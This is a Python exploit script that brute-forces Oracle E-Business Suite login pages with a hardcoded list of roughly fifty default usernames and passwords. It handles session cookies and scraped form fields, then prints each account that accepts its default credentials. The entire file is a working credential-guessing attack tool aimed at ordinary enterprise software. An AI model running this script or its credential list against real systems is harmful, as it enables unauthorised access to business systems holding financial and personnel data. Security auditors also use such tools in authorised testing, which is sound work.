#!/usr/bin/env python
# Exploit Title: EBS Users Brute-force Exploit
# Date: 03/20/2018
# Exploit Author: @0xalg
# Vendor Homepage: https://ERPScan.com
# Version: 1.1

import requests
import argparse
import logging
import sys
from bs4 import BeautifulSoup
from ansicolor import red, green, blue, magenta


help_desc = """
EBS Users Brute-force python script brutes EBS default users with predefined passwords.
"""

creds = [('AME_INVALID_APPROVER', 'welcome'),
         ('ANONYMOUS', 'welcome'),
         ('APPSMGR', 'appsmgr'),
         ('APPSMGR', 'welcome'),
         ('ASADMIN', 'welcome'),
         ('ASGADM', 'asgadm'),
         ('ASGADM', 'welcome'),
         ('ASGUEST', 'welcome'),
         ('AUTOINSTALL', 'datamerge'),
         ('AUTOINSTALL', 'welcome'),
         ('CONCURRENT MANAGER', 'welcome'),
         ('FEEDER SYSTEM', 'welcome'),
         ('GUEST', 'oracle'),
         ('IBE_ADMIN', 'manager'),
         ('IBE_GUEST', 'welcome'),
         ('IBEGUEST', 'ibeguest2000'),
         ('IEXADMIN', 'collections'),
         ('IEXADMIN', 'welcome'),
         ('INDUSTRY DATA', 'welcome'),
         ('INITIAL SETUP', 'welcome'),
         ('IRC_EMP_GUEST', 'welcome'),
         ('IRC_EXT_GUEST', 'welcome'),
         ('MOBADM', 'mobadm'),
         ('MOBADM', 'welcome'),
         ('MOBDEV', 'mobdev'),
         ('MOBDEV', 'welcome'),
         ('MOBILEADM', 'mobileadm'),
         ('MOBILEADM', 'welcome'),
         ('MOBILEDEV', 'mobiledev'),
         ('MOBILEDEV', 'welcome'),
         ('OP_CUST_CARE_ADMIN', 'op_cust_care_admin'),
         ('OP_CUST_CARE_ADMIN', 'welcome'),
         ('OP_SYSADMIN', 'op_sysadmin'),
         ('OP_SYSADMIN', 'welcome'),
         ('ORACLE12.0.0', 'welcome'),
         ('ORACLE12.1.0', 'welcome'),
         ('ORACLE12.2.0', 'welcome'),
         ('ORACLE12.3.0', 'welcome'),
         ('ORACLE12.4.0', 'welcome'),
         ('ORACLE12.5.0', 'welcome'),
         ('ORACLE12.6.0', 'welcome'),
         ('ORACLE12.7.0', 'welcome'),
         ('ORACLE12.8.0', 'welcome'),
         ('ORACLE12.9.0', 'welcome'),
         ('PORTAL30', 'portal30'),
         ('PORTAL30', 'portal30_new'),
         ('PORTAL30_SSO', 'portal30_sso_new'),
         ('STANDALONE BATCH PROCESS', 'welcome'),
         ('SYSADMIN', 'sysadmin'),
         ('WIZARD', 'welcome'),
         ('XML_USER', 'welcome')]

base_url = ''
headers_ = {
        'User-Agent': 'Mozilla/5.0 Firefox/53.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer':'',
        'X-Service': 'AuthenticateUser',
        'DNT': '1'
    }
timeout_ = 10
count = 0

parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-H', '--host', default='127.0.0.1', help='EBS host (default: 127.0.0.1). Example: ebs.example.com')
parser.add_argument('-P', '--port', default=8000, type=int, help='EBS web port (default: 8000)')
parser.add_argument('-s', '--ssl', action='store_true', help='enable SSL')
parser.add_argument('-t', '--timeout', default=10, type=int, help='HTTP connection timeout in second (default: 10)')
parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')


def send_request(url, headers, redirects, data=None):
    if data is None:
        try:
            r = requests.get(url, headers=headers, timeout=timeout_, verify=False, allow_redirects=redirects)
        except requests.exceptions.ConnectionError:
            print "Error. Connection refused."
            sys.exit(1)
        except requests.exceptions.Timeout:
            print magenta("[!]") + " Time of response exceeded {} seconds!".format(timeout)
            sys.exit(1)
    else:
        try:
            r = requests.post(url, headers=headers, data=data, timeout=timeout_, verify=False, allow_redirects=redirects)
        except requests.exceptions.ConnectionError:
            print "Error. Connection refused."
            sys.exit(1)
        except requests.exceptions.Timeout:
            print magenta("[!]") + " Time of response exceeded {} seconds!".format(timeout_)
            sys.exit(1)

    if r.status_code != 200 and r.status_code != 302:
        print "Error with HTTP code", r.status_code
        print r.text
        sys.exit(-1)
    return r


def handle_request(name_o, pass_o, verbose):
    headers_['Cookie'] = ""
    global count
    # 1 request
    request_1 = send_request(base_url, headers_, False)

    if 'Set-Cookie' in request_1.headers:
        headers_['Cookie'] = str(request_1.headers['Set-Cookie'])[:str(request_1.headers['Set-Cookie']).index(";") + 1]

    if 'Location' in request_1.headers: # check redirect to old auth version
        url_2 = request_1.headers['Location']
        # 2 request
        request_2 = send_request(url_2, headers_, False)
        soup = BeautifulSoup(request_2.text, "lxml")
        items = ["_FORM", "SubmitButton", "FORM_MAC_LIST"]
        url_3 = (str(soup.form['action']))
        url_3 = base_url[:base_url.index("/OA_HTML")] + url_3
        forms = [str(soup.find(id=obj)) for obj in items]

        for index, item in enumerate(forms):  # stripping values
            if "value=" in item:
                forms[index] = item[
                    item.index("value=") + len("value=") + 1: item.index("\"", item.index("value=") + len("value=") + 1)]
            elif "_FORM_SUBMIT_BUTTON" in item:
                forms[index] = item[
                           item.index("_FORM_SUBMIT_BUTTON") + len("_FORM_SUBMIT_BUTTON':") + 1:item.rindex("'});")]
            else:
                forms[index] = ""

        dictionary = dict(zip(items, forms))
        dictionary['usernameField'] = name_o
        dictionary['passwordField'] = pass_o
        dictionary['_FORM_SUBMIT_BUTTON'] = dictionary.pop('SubmitButton')
        headers_['Cookie'] = headers_['Cookie'] + request_2.headers['Set-Cookie']
        # 3 request
        request_3 = send_request(url_3, headers_, False, dictionary)
        check = request_3.headers['Location'] if request_3.headers['Location'] else ""

        if "errCode=FND_APPL_LOGIN_FAIL" in check:
            if verbose:
                print green('[*]') + "\tStatus: " + green('not found') + " : " + blue(name_o) + " : " + blue(pass_o)
        else:
            print red('[x]') + "\tStatus: " + red('found') + " : " + blue(name_o) + " : " + blue(pass_o)
            count += 1
    else:
        request_2 = send_request(base_url, headers_, False,
                                 data={'username': name_o, 'password': pass_o, '_lAccessibility': 'N', 'langCode': 'US'})
        soup = BeautifulSoup(request_2.text, "lxml")
        result = str(soup.p)
        result = result[result.index("status:") + len("status:"):result.index(",", result.index("status:"))]\
            .strip(' ').strip('\'')

        if result == 'success':
            print red('[x]') + "\tStatus:" + red('found') + " : " + blue(name_o) + " : " + blue(pass_o)
            count += 1
        elif verbose:
            print green('[*]')+ "\tStatus: " + green('not found') + " : " + blue(name_o) + " : " + blue(pass_o)

    return


def f_check():
    global timeout_, base_url
    logging.captureWarnings(True)  # Capture the ssl warnings with the standard logging module

    if args.ssl:
        base_url = "https://%s:%s/OA_HTML/AppsLocalLogin.jsp?" % (args.host, args.port)
    else:
        base_url = "http://%s:%s/OA_HTML/AppsLocalLogin.jsp?" % (args.host, args.port)

    headers_['Referer'] = base_url.replace('?', '')

    for item in creds:
        handle_request(item[0], item[1], args.verbose)

    timeout_ = args.timeout

    print "Found: ", red(str(count)), " users with predefined passwords."


if __name__ == '__main__':
    args = parser.parse_args()
    f_check()
